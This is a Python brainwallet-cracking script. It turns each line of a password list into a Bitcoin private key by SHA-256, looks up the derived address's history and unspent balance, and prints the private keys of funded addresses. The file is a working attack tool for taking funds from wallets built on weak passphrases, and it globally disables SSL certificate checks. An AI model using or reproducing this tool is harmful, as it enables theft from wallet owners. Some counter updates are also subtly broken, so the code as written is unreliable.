from bitcoin import *
import ssl
import argparse
from multiprocessing import Pool, Lock, Value 

#Global shared memory values 
total_exists = Value('i', 0)
total_balance = Value('i', 0)
total_errors = Value('i', 0)


#
# bypassing SSL errors due to unverified certificates
#
ssl._create_default_https_context = ssl._create_unverified_context


def create_parse():
    parser = argparse.ArgumentParser(
        description='Utility to try crack bitcoins private keys generated from weak passphrases.')
    parser.add_argument('pass_list', help='Password list')
    return parser


def count_lines(filename):
    t = 0
    with open(filename) as fp:
        for line in fp:
            t += 1
    return t


def crack_process(pwd):
    """
    crack_process performs the action of checking to see if a public key addresses
    can be found that is generated by the password for the private key. For any 
    addresses that are found to have history, it will also check unspent values 
    on the address. Updates shared values for tracking existance of addresses matching
    a password in the list, total balances

    Args:
        pwd: the plaintext password to find matching public addresses for 

    """

    print("Worker thread for password {}".format(pwd))
    try:
        priv = sha256(pwd)
        pub = privtopub(priv)
        addr = pubtoaddr(pub)
        h = history(addr)
        if h and any(h):
            with total_exists.get_lock():
                total_exists += 1
        
            print('Found history on address: {}'.format(addr))
            print('For Passphrase: {}'.format(pwd))
            
            u = unspent(addr)
            if u and any(u):
                with total_balance.get_lock():
                    total_balance.value += 1
        
                print('BINGO! Found also unspent')
                print('Private Key: {}'.format(priv))
                print('Public Key: {}'.format(pub))

    except Exception as e:
        with total_errors.get_lock():
            total_errors += 1
        print('Error on {}'.format(pwd))
        print(e)


def crack(pwd_file):
    print('Using file: {}'.format(pwd_file))
    total = count_lines(pwd_file)
    
    log_blocks = int(total * 0.0001)
    if log_blocks == 0:
        log_blocks = total
        
    with open(pwd_file) as fp:
        with Pool() as pool:
            for i, pwd in enumerate(fp):
                try:
                    if i % log_blocks == 0:
                        print('Progress: {0:.2f}%'.format(float(i) / total * 100.00))
                    if pwd:
                        pool.apply_async(crack_process, (pwd,))
                except Exception as e:
                    print("Error on processing {}".format(e))
            #wait for remaining processes to finish...
            pool.close()
            pool.join()
            
    return total


def start():
    parser = create_parse()
    args = parser.parse_args()
    pass_list = args.pass_list
    total = crack(pass_list)
    print('Total: {}'.format(total))
    print('Total with history: {}'.format(total_exists.value))
    print('Total with balance: {}'.format(total_balance.value))
    print('Total errors: {}'.format(total_errors.value))


if __name__ == '__main__':
    start()
